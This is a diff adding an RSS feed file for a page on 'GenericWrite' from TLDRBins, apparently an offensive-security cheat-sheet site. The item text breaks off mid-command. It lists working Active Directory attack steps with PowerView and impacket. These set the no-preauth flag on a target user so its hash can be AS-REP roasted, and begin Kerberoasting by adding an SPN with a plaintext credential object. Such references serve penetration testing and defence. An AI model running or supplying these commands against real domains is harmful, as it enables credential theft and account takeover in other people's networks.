@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>GenericWrite on TLDRBins</title>
+    <link>https://tldrbins.github.io/@genericwrite/</link>
+    <description>Recent content in GenericWrite on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@genericwrite/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+    </item>
+  </channel>
+</rss>
